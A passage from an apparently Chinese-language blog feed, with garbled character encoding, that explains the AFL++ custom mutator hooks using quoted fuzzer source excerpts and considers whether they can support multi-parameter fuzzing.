class="hljs-params">(<span class="hljs-type">void</span> *data, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> **out_buf)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">afl_custom_post_trim</span><span class="hljs-params">(<span class="hljs-type">void</span> *data, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> success)</span></span>;<br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">afl_custom_havoc_mutation</span><span class="hljs-params">(<span class="hljs-type">void</span> *data, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> buf_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> **out_buf, <span class="hljs-type">size_t</span> max_size)</span></span>;<br><span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> <span class="hljs-title">afl_custom_havoc_mutation_probability</span><span class="hljs-params">(<span class="hljs-type">void</span> *data)</span></span>;<br><span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> <span class="hljs-title">afl_custom_queue_get</span><span class="hljs-params">(<span class="hljs-type">void</span> *data, <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *filename)</span></span>;<br><span class="hljs-built_in">void</span> (*afl_custom_fuzz_send)(<span class="hljs-type">void</span> *data, <span class="hljs-type">const</span> u8 *buf, <span class="hljs-type">size_t</span> buf_size);<br><span class="hljs-function">u8 <span class="hljs-title">afl_custom_queue_new_entry</span><span class="hljs-params">(<span class="hljs-type">void</span> *data, <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *filename_new_queue, <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *filename_orig_queue)</span></span>;<br><span class="hljs-function"><span class="hljs-type">const</span> <span class="hljs-type">char</span>* <span class="hljs-title">afl_custom_introspection</span><span class="hljs-params">(<span class="hljs-type">my_mutator_t</span> *data)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">afl_custom_deinit</span><span class="hljs-params">(<span class="hljs-type">void</span> *data)</span></span>;<br></code></pre></td></tr></tbody></table></figure><p><strong>pythonï¼š</strong></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">seed</span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuzz_count</span>(<span class="hljs-params">buf</span>):<br>    <span class="hljs-keyword">return</span> cnt<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">splice_optout</span>()<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuzz</span>(<span class="hljs-params">buf, add_buf, max_size</span>):<br>    <span class="hljs-keyword">return</span> mutated_out<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">describe</span>(<span class="hljs-params">max_description_length</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">"description_of_current_mutation"</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post_process</span>(<span class="hljs-params">buf</span>):<br>    <span class="hljs-keyword">return</span> out_buf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_trim</span>(<span class="hljs-params">buf</span>):<br>    <span class="hljs-keyword">return</span> cnt<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">trim</span>():<br>    <span class="hljs-keyword">return</span> out_buf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post_trim</span>(<span class="hljs-params">success</span>):<br>    <span class="hljs-keyword">return</span> next_index<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">havoc_mutation</span>(<span class="hljs-params">buf, max_size</span>):<br>    <span class="hljs-keyword">return</span> mutated_out<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">havoc_mutation_probability</span>():<br>    <span class="hljs-keyword">return</span> probability <span class="hljs-comment"># int in [0, 100]</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">queue_get</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuzz_send</span>(<span class="hljs-params">buf</span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">queue_new_entry</span>(<span class="hljs-params">filename_new_queue, filename_orig_queue</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">introspection</span>():<br>    <span class="hljs-keyword">return</span> string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">deinit</span>():  <span class="hljs-comment"># optional for Python</span><br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></tbody></table></figure><h3 id="ç»†èŠ‚ï¼ˆC-x2F-C-ï¼‰"><a href="#ç»†èŠ‚ï¼ˆC-x2F-C-ï¼‰" class="headerlink" title="ç»†èŠ‚ï¼ˆC/C++ï¼‰"></a>ç»†èŠ‚ï¼ˆC/C++ï¼‰</h3><p><strong>å˜å¼‚éƒ¨åˆ†</strong>ï¼š</p><ul><li><code>afl_custom_queue_get</code>ï¼šç”¨äºç§å­è°ƒåº¦ï¼Œå†³å®šè¯¥ç§å­æ˜¯å¦è¢«æ¨¡ç³Šæµ‹è¯•ï¼›</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 393 in afl-fuzz-one.c</span><br><span class="hljs-keyword">if</span> (unlikely(afl-&gt;custom_mutators_count)) {<br><br>    <span class="hljs-comment">/* The custom mutator will decide to skip this test case or not. */</span><br><br>    LIST_FOREACH(&amp;afl-&gt;custom_mutator_list, <span class="hljs-keyword">struct</span> custom_mutator, {<br><br>      <span class="hljs-keyword">if</span> (el-&gt;afl_custom_queue_get &amp;&amp;<br>          !el-&gt;afl_custom_queue_get(el-&gt;data, afl-&gt;queue_cur-&gt;fname)) {<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>      }<br><br>    });<br><br>  }<br></code></pre></td></tr></tbody></table></figure><ul><li><code>afl_custom_fuzz_count</code>ï¼šfuzzæ¬¡æ•°ï¼Œç›¸å½“äºstage_maxï¼›</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 1883 in afl-fuzz-one.c</span><br>      <span class="hljs-keyword">if</span> (el-&gt;afl_custom_fuzz_count) {<br><br>        afl-&gt;stage_max = el-&gt;afl_custom_fuzz_count(el-&gt;data, out_buf, len);<br><br>      } <span class="hljs-keyword">else</span> {<br><br>        afl-&gt;stage_max = saved_max;<br><br>      }<br>  ...<br><span class="hljs-comment">// Line 1905 in afl-fuzz-one.c</span><br>      <span class="hljs-keyword">if</span> (!el-&gt;afl_custom_fuzz_count) {<br><br>              <span class="hljs-comment">/* If we're finding new stuff, let's run for a bit longer, limits</span><br><span class="hljs-comment">                permitting. */</span><br><br>              <span class="hljs-keyword">if</span> (afl-&gt;queued_items != havoc_queued) {<br><br>                <span class="hljs-keyword">if</span> (perf_score &lt;= afl-&gt;havoc_max_mult * <span class="hljs-number">100</span>) {<br><br>                  afl-&gt;stage_max *= <span class="hljs-number">2</span>;<br>                  perf_score *= <span class="hljs-number">2</span>;<br><br>                }<br><br>                havoc_queued = afl-&gt;queued_items;<br><br>              }<br><br>            }<br></code></pre></td></tr></tbody></table></figure><ul><li><code>afl_custom_fuzz</code>ï¼šæ‰§è¡Œç‰¹å®šçš„å˜å¼‚æ“ä½œï¼›</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 1932 in afl-fuzz-one.c</span><br>          <span class="hljs-type">size_t</span> mutated_size =<br>              el-&gt;afl_custom_fuzz(el-&gt;data, out_buf, len, &amp;mutated_buf, new_buf, target_len, max_seed_size);<br></code></pre></td></tr></tbody></table></figure><ul><li><code>afl_custom_havoc_mutation_probability</code>ï¼šè¡¨ç¤º<code>afl_custom_havoc_mutation</code>è¢«è°ƒç”¨çš„æ¦‚ç‡</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 2041 in afl-fuzz-one.c</span><br><span class="hljs-keyword">if</span> (el-&gt;stacked_custom &amp;&amp; el-&gt;afl_custom_havoc_mutation_probability) {<br><br>        el-&gt;stacked_custom_prob =<br>            el-&gt;afl_custom_havoc_mutation_probability(el-&gt;data);<br>        <span class="hljs-keyword">if</span> (el-&gt;stacked_custom_prob &gt; <span class="hljs-number">100</span>) {<br><br>          FATAL(<br>              <span class="hljs-string">"The probability returned by "</span><br>              <span class="hljs-string">"afl_custom_havoc_mutation_propability "</span><br>              <span class="hljs-string">"has to be in the range 0-100."</span>);<br><br>        }<br><br>      }<br></code></pre></td></tr></tbody></table></figure><ul><li><code>afl_custom_havoc_mutation</code>ï¼šè‡ªå®šä¹‰<code>havoc</code>å˜å¼‚æ“ä½œï¼›</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 2106 in afl-fuzz-one.c</span><br>    <span class="hljs-keyword">if</span> (afl-&gt;custom_mutators_count) {<br><br>        LIST_FOREACH(&amp;afl-&gt;custom_mutator_list, <span class="hljs-keyword">struct</span> custom_mutator, {<br><br>          <span class="hljs-keyword">if</span> (el-&gt;stacked_custom &amp;&amp;<br>              rand_below(afl, <span class="hljs-number">100</span>) &lt; el-&gt;stacked_custom_prob) {<br><br>            u8    *custom_havoc_buf = <span class="hljs-literal">NULL</span>;<br>            <span class="hljs-type">size_t</span> new_len = el-&gt;afl_custom_havoc_mutation(<br>                el-&gt;data, out_buf, temp_len, &amp;custom_havoc_buf, MAX_FILE);<br>            <span class="hljs-keyword">if</span> (unlikely(!custom_havoc_buf)) {<br><br>              FATAL(<span class="hljs-string">"Error in custom_havoc (return %zu)"</span>, new_len);<br><br>            }<br><br>            <span class="hljs-keyword">if</span> (likely(new_len &gt; <span class="hljs-number">0</span> &amp;&amp; custom_havoc_buf)) {<br><br>              temp_len = new_len;<br>              <span class="hljs-keyword">if</span> (out_buf != custom_havoc_buf) {<br><br>                out_buf = afl_realloc(AFL_BUF_PARAM(out), temp_len);<br>                <span class="hljs-keyword">if</span> (unlikely(!afl-&gt;out_buf)) { PFATAL(<span class="hljs-string">"alloc"</span>); }<br>                <span class="hljs-built_in">memcpy</span>(out_buf, custom_havoc_buf, temp_len);<br><br>              }<br><br>            }<br><br>          }<br><br>        });<br><br>      }<br></code></pre></td></tr></tbody></table></figure><hr><p><strong>åˆå§‹åŒ–/æ¸…ç†éƒ¨åˆ†</strong>ï¼š</p><ul><li><code>afl_custom_init</code>ï¼šè¿›è¡Œä¸€äº›åˆå§‹åŒ–æ“ä½œmaybe? åˆå§‹åŒ–ä¸€äº›dataæ•°æ®ï¼Ÿ<code>mutator-&gt;data</code>ä¸ºvoidç±»å‹æ•°æ®ï¼Œå¯ä»¥å­˜æ”¾ä¸€äº›è‡ªå®šä¹‰çš„ä¸œè¥¿ï¼Ÿ</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 1838 in afl-fuzz.c</span><br>  setup_custom_mutators(afl);<br><span class="hljs-comment">// -------------------------------------</span><br><span class="hljs-comment">// Line 335 in afl-fuzz-mutators.c </span><br>  <span class="hljs-comment">/* Initialize the custom mutator */</span><br>  <span class="hljs-keyword">if</span> (mutator-&gt;afl_custom_init) {<br><br>    mutator-&gt;data = mutator-&gt;afl_custom_init(afl, rand_below(afl, <span class="hljs-number">0xFFFFFFFF</span>));<br><br>  }<br></code></pre></td></tr></tbody></table></figure><p>è°ƒç”¨é“¾ï¼šafl-fuzz.c main ==&gt; setup_custom_mutators ==&gt; load_custom_mutator ==&gt; afl_custom_init</p><ul><li><code>afl_custom_deinit</code>ï¼šè¿›è¡Œmutatorçš„ä¸€äº›æ¸…ç†ç¨‹åº</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 2648 in afl-fuzz.c </span><br>  destroy_custom_mutators(afl);<br></code></pre></td></tr></tbody></table></figure><p>è°ƒç”¨é“¾ï¼š afl-fuzz.c main ==&gt; destroy_custom_mutators ==&gt; afl_custom_deinit</p><hr><p><strong>Trimç›¸å…³ï¼š</strong></p><p><span class="github-emoji"><span>ğŸ–</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f356.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> å°è£…åœ¨<code>trim_case_custom</code>å‡½æ•°ä¸­ï¼ˆLine 350 in afl-fuzz-mutators.cä¸­ï¼‰</p><p>å®Œæ•´è°ƒç”¨é“¾ï¼šafl-fuzz-run.c (trim_case: 811) ==&gt; trim_case_custom ==&gt; xxx</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 823 in afl-fuzz-run.c</span><br>  <span class="hljs-keyword">if</span> (el-&gt;afl_custom_trim) {<br><br>        trimmed_case = trim_case_custom(afl, q, in_buf, el);<br>        custom_trimmed = <span class="hljs-literal">true</span>;<br><br>      }<br></code></pre></td></tr></tbody></table></figure><ul><li><code>afl_custom_init_trim</code>ï¼šåˆå§‹åŒ–æ“ä½œï¼Ÿå¯ä»¥å®šä¹‰trimmingæ­¥é•¿ ==&gt; stage_maxï¼Ÿè¿”å›trimæ¬¡æ•°ï¼Ÿ</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 365 in afl-fuzz-mutators.c (trim_case_custom())</span><br> afl-&gt;stage_cur = <span class="hljs-number">0</span>;<br> s32 retval = mutator-&gt;afl_custom_init_trim(mutator-&gt;data, in_buf, q-&gt;len);<br> <span class="hljs-keyword">if</span> (unlikely(retval) &lt; <span class="hljs-number">0</span>) {<br><br>   FATAL(<span class="hljs-string">"custom_init_trim error ret: %d"</span>, retval);<br><br> } <span class="hljs-keyword">else</span> {<br><br>   afl-&gt;stage_max = retval;  <span class="hljs-comment">// &lt;============ trimming step!</span><br><br> }<br></code></pre></td></tr></tbody></table></figure><ul><li><code>afl_custom_trim</code>ï¼šæ‰§è¡Œè‡ªå®šä¹‰çš„ç²¾ç®€æ“ä½œï¼Ÿ</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 384 in afl-fuzz-mutators.c (trim_case_custom())</span><br><span class="hljs-keyword">while</span> (afl-&gt;stage_cur &lt; afl-&gt;stage_max) {<br><br>    u8 *retbuf = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-built_in">sprintf</span>(afl-&gt;stage_name_buf, <span class="hljs-string">"ptrim %s"</span>,<br>            u_stringify_int(val_buf, trim_exec));<br><br>    u64 cksum;<br><br>    <span class="hljs-type">size_t</span> retlen = mutator-&gt;afl_custom_trim(mutator-&gt;data, &amp;retbuf);<br>    ...<br>}<br></code></pre></td></tr></tbody></table></figure><ul><li><code>afl_custom_post_trim</code>ï¼šä¿®å‰ªåå¤„ç†æ“ä½œï¼Ÿåˆ¤æ–­ä¿®å‰ªæ˜¯å¦æˆåŠŸï¼Ÿå¹¶æ›´æ”¹ä¸€äº›å‚æ•°å€¼ï¼Ÿ</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 476 in afl-fuzz-mutators.c (trim_case_custom())</span><br>afl-&gt;stage_cur = mutator-&gt;afl_custom_post_trim(mutator-&gt;data, <span class="hljs-number">1</span>);<br>  ...<br><span class="hljs-comment">// Line 488 in afl-fuzz-mutators.c (trim_case_custom())</span><br>s32 retval2 = mutator-&gt;afl_custom_post_trim(mutator-&gt;data, <span class="hljs-number">0</span>);<br></code></pre></td></tr></tbody></table></figure><hr><p><strong>å…¶ä»–ï¼š</strong></p><ul><li><code>afl_custom_post_process</code>ï¼špost-processingå‡½æ•°ï¼Œåœ¨AFLå°†æµ‹è¯•ç”¨ä¾‹å†™åˆ°ç£ç›˜ä¹‹å‰è°ƒç”¨ï¼ˆwrite_to_testcase?ï¼‰ï¼Œä»¥ä¾¿æ‰§è¡Œè¢«æµ‹ç›®æ ‡</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 67 in afl-fuzz-run.c</span><br>u32 __attribute__((hot))<br>write_to_testcase(<span class="hljs-type">afl_state_t</span> *afl, <span class="hljs-type">void</span> **mem, u32 len, u32 fix) {<br>...<br>    <span class="hljs-comment">// Line 87 in afl-fuzz-run.c</span><br>    <span class="hljs-keyword">if</span> (el-&gt;afl_custom_post_process) {<br><br>        new_size =<br>            el-&gt;afl_custom_post_process(el-&gt;data, new_mem, new_size, &amp;new_buf);<br><br>        <span class="hljs-keyword">if</span> (unlikely(!new_buf || new_size &lt;= <span class="hljs-number">0</span>)) {<br><br>          new_size = <span class="hljs-number">0</span>;<br>          new_buf = new_mem;<br>          <span class="hljs-comment">// FATAL("Custom_post_process failed (ret: %lu)", (long</span><br>          <span class="hljs-comment">// unsigned)new_size);</span><br><br>        } <span class="hljs-keyword">else</span> {...}<br>...<br>}<br></code></pre></td></tr></tbody></table></figure><ul><li><p><code>afl_custom_queue_new_entry</code>ï¼šå…è®¸é¢å¤–çš„åˆ†æï¼ˆä¾‹å¦‚ï¼Œè°ƒç”¨ä¸€ä¸ªä¸åŒçš„å·¥å…·ï¼Œåšä¸€ä¸ªä¸åŒçš„è¦†ç›–ç‡ï¼Œå¹¶å°†å…¶ä¿å­˜åœ¨è‡ªå®šä¹‰å˜å¼‚å™¨ä¸­ï¼‰</p><p>è°ƒç”¨é“¾ï¼šafl-fuzz-init.c (pivot_inputs()) ==&gt; run_afl_custom_queue_new_entry() ==&gt; afl_custom_queue_new_entry()</p></li><li><p><code>afl_custom_describe</code>ï¼šç»™ä¿å­˜çš„æ–‡ä»¶åæ·»åŠ é¢å¤–çš„æè¿°</p></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Line 340 in afl-fuzz-bitmap.c(describe_op())</span><br>      <span class="hljs-type">const</span> <span class="hljs-type">char</span> *custom_description = afl-&gt;current_custom_fuzz-&gt;afl_custom_describe(afl-&gt;current_custom_fuzz-&gt;data, size_left);<br>      <span class="hljs-keyword">if</span> (!custom_description || !custom_description[<span class="hljs-number">0</span>]) {<br><br>        DEBUGF(<span class="hljs-string">"Error getting a description from afl_custom_describe"</span>);<br>        <span class="hljs-comment">/* Take the stage name as description fallback */</span><br>        <span class="hljs-built_in">sprintf</span>(ret + len_current, <span class="hljs-string">"op:%s"</span>, afl-&gt;stage_short);<br><br>      } <span class="hljs-keyword">else</span> {<br><br>        <span class="hljs-comment">/* We got a proper custom description, use it */</span><br>        <span class="hljs-built_in">strncat</span>(ret + len_current, custom_description, size_left);  <span class="hljs-comment">// &lt;==== add describe here!</span><br><br>      }<br></code></pre></td></tr></tbody></table></figure><h2 id="3-æ€»ç»“"><a href="#3-æ€»ç»“" class="headerlink" title="3. æ€»ç»“"></a>3. æ€»ç»“</h2><ol><li><p>AFL++ custom mutatorsæœ¬è´¨ä¸Šä¸æ˜¯ä¸€ä¸ªæ’ä»¶ï¼Œè€Œæ˜¯åœ¨AFL++æ¨¡ç³Šæµ‹è¯•é˜¶æ®µè®¾ç½®äº†è‹¥å¹²å‡½æ•°ç«¯ç‚¹ï¼Œå¹¶ä»¥C/C++æ¥å£æˆ–è€…Pythonæ¥å£çš„æ–¹å¼æš´éœ²ç»™ç”¨æˆ·ï¼Œå¹¶æä¾›ç»™ç”¨æˆ·ä½¿ç”¨ï¼Œæ—¨åœ¨<strong>æé«˜æ¨¡ç³Šå™¨çš„åŠŸèƒ½æ€§</strong></p></li><li><p>å¤šå‚æ•°é¡¹ç›®å¯¹<code>fuzz_one()</code>è¿›è¡Œäº†å¤§æ”¹ï¼Œä¸»è¦åŒ…æ‹¬ä¸¤ä¸ªéƒ¨åˆ†ï¼šç¬¬ä¸€ä¸ªéƒ¨åˆ†ä»jsonæ–‡ä»¶ä¸­è¯»å…¥å‚æ•°è§„èŒƒï¼Œç¬¬äºŒä¸ªéƒ¨åˆ†æ˜¯æ ¹æ®å‚æ•°ç±»å‹é€‰æ‹©ç‰¹å®šçš„å˜å¼‚æ“ä½œï¼ŒAFL++ custom mutatorsè™½ç„¶æä¾›äº†å˜å¼‚æ–¹æ³•ï¼Œä½†è¯¥æ–¹æ³•æ˜¯åœ¨ç¡®å®šæ€§å˜å¼‚åã€havocå˜å¼‚ä¹‹å‰æ‰§è¡Œçš„ï¼Œæ­¤å¤–è¿˜å¯ä»¥åœ¨havocé˜¶æ®µæ·»åŠ havoc_mutatorï¼Œä½†ï¼š</p><p><span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> å¤šå‚æ•°é¡¹ç›®æ‹†è§£äº†ç¡®å®šæ€§å˜å¼‚å’Œhavocï¼Œæ ¹æ®å‚æ•°çš„ç±»å‹æ¥pické€‚å½“çš„å˜å¼‚æ“ä½œï¼Œå› æ­¤å°†å¤šå‚æ•°å˜å¼‚æ·»åŠ åˆ°custom mutatorsé‡Œä¸ä¼šæœ‰å•¥æ•ˆæœï¼›</p><p><span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> AFL++ custom mutatorsçš„æµç¨‹æ˜¯ï¼šåœ¨è¿›è¡Œç¡®å®šæ€§å˜å¼‚ä¹‹åï¼Œå¦‚æœå®šä¹‰äº†custom_mutatorï¼Œé‚£ä¹ˆå°±æ‰§è¡Œcustom_mutatorå®šä¹‰çš„å˜å¼‚ï¼Œå¦åˆ™è·³è½¬åˆ°è¿›è¡Œhavocå˜å¼‚ï¼Œå…¶æœ¬è´¨è¿˜æ˜¯åŸç”ŸAFL++å¯¹äºå•ä¸ªè¾“å…¥çš„é¡ºåºå˜å¼‚æ–¹å¼ï¼Œå¹¶æ²¡æœ‰ä½“ç°å¤šå‚æ•°çš„æ€§è´¨ã€‚å› æ­¤å¦‚æœè¦å®ç°å¤šå‚æ•°ï¼Œè¿˜æ˜¯éœ€è¦å¯¹å¼•æ“è¿›è¡Œä¿®æ”¹ï¼›</p><p><span class="github-emoji"><span>3âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0033-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> è§£æå‚æ•°è§„èŒƒçš„éƒ¨åˆ†è²Œä¼¼æ— æ³•æ·»åŠ åˆ°åˆé€‚çš„æ¥å£ä¸Šï¼›</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>æ¨¡ç³Šæµ‹è¯•</tag>
      
      <tag>AFL++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ReZZan:Efficient Greybox Fuzzing to Detect Memory Errors</title>
    <link href="/2023/01/10/ReZZan/"/>
    <url>/2023/01/10/ReZZan/</url>
    
